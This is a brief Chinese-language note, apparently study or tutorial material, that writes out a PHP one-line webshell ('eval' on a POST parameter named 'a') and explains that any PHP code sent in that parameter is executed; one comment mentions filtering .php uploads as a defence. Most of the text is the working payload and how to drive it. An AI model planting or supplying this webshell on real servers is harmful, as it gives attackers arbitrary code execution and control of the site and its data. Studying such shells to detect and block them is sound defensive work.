### 1、php一句话木马代码
```
<!-- 防御的之后，顾虑php后缀的文件即可。
因为php只解析.php后缀的文件。
一般一句话木马，就是websehll，同时必须以.php结尾 -->

<?php eval($_POST['a']);

// eval是执行php代码的
```
### 2、解析：
a的值用post请求发送，值可以是任何php代码